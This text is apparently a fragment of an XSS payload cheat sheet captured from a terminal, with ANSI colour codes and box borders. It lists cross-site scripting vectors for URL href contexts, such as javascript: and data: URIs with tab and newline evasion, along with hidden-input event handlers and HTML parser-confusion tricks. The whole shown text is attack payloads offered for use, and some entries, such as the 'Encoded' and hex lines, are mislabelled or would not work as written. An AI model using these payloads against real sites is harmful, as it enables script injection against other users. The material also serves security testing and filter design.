[34m│[0m **URL CONTEXT (href):**                                                      [34m│[0m
[34m│[0m - Inject protocol: `javascript:alert(1)`                                     [34m│[0m
[34m│[0m - Or data URI: `data:text/html,<script>alert(1)</script>`                    [34m│[0m
[34m│[0m - Encoded: `javascript:prompt(1)`                                            [34m│[0m
[34m│[0m - Hex/Octal: `\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)`          [34m│[0m
[34m│[0m - With newline: `java%0ascript:alert(1)` (LF)                                [34m│[0m
[34m│[0m - With tab: `java%09script:alert(1)` (HT)                                    [34m│[0m
[34m│[0m - With CR: `java%0dscript:alert(1)` (CR)                                     [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **HIDDEN INPUT:**                                                            [34m│[0m
[34m│[0m ```html                                                                      [34m│[0m
[34m│[0m <input type="hidden" accesskey="X" onclick="alert(1)">                       [34m│[0m
[34m│[0m <!-- Use CTRL+SHIFT+X to trigger -->                                         [34m│[0m
[34m│[0m <input type="hidden" oncontentvisibilityautostatechange="alert(1)"           [34m│[0m
[34m│[0m style="content-visibility:auto">                                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### HTML Parser Confusion                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```html                                                                      [34m│[0m
[34m│[0m Unclosed tags          │ <img src=x onerror=alert(1)                         [34m│[0m
[34m│[0m Self-closing abuse     │ <script/src=x></script/>                            [34m│[0m
[34m│[0m Attribute without =    │ <input onfocus autofocus>                           [34m│[0m
[34m│[0m Backtick in attribute  │ <img src=`x` onerror=alert(1)>                      [34m│[0m
[34m│[0m Newlines in tags       │ <img%0asrc=x%0aonerror=alert(1)>                    [34m│[0m
[34m│[0m Entity in tag name     │ <&#x73;cript>                                       [34m│[0m
[34m│[0m Null in tag            │ <scr\0ipt>                                          [34m│[0m
[34m│[0m Comment trickery       │ <!--><script>alert(1)</script>-->                   [34m│[0m
[34m│[0m CDATA sections         │ <![CDATA[<script>alert(1)</script>]]>               [34m│[0m
[34m│[0m Incomplete tag         │ <img src='1' onerror='alert(0)' <                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
